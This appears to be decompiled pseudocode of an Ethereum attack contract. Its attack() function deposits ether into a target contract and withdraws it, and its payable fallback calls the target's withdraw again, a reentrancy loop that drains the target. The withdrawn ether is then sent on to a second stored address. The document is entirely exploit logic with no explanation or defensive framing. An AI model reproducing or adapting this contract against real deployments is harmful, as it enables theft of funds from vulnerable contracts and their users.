contract main {


// =======================  Init code  ======================


uint256 stor0;
uint256 stor1;

function _fallback() payable {
    stor0 = code.data[1459 len 32]
    stor1 = code.data[1491 len 32]
    return code.data[145 len 1314]
}



// =====================  Runtime code  =====================


address stor0;
address stor1;
uint256 stor2;

function _fallback() payable {
    call stor0.withdraw(uint256 rg1) with:
         gas gas_remaining - 25050 wei
        args stor2
    require ext_call.success
}

function withdraw() payable {
    call stor0.balanceOf(address rg1) with:
         gas gas_remaining - 25050 wei
        args this.address
    require ext_call.success
    call stor0.withdraw(uint256 rg1) with:
         gas gas_remaining - 25050 wei
        args ext_call.return_data[0]
    call stor1 with:
       value eth.balance(this.address) wei
         gas gas_remaining - 34050 wei
}

function attack() payable {
    stor2 = eth.balance(this.address)
    call stor0.deposit() with:
       value stor2 wei
         gas gas_remaining - 34050 wei
    require ext_call.success
    call stor0.balanceOf(address rg1) with:
         gas gas_remaining - 25050 wei
        args this.address
    call stor0.withdraw(uint256 rg1) with:
         gas gas_remaining - 25050 wei
        args ext_call.return_data[0]
    call stor1 with:
       value eth.balance(this.address) / 3 wei
         gas gas_remaining - 34050 wei
}



}
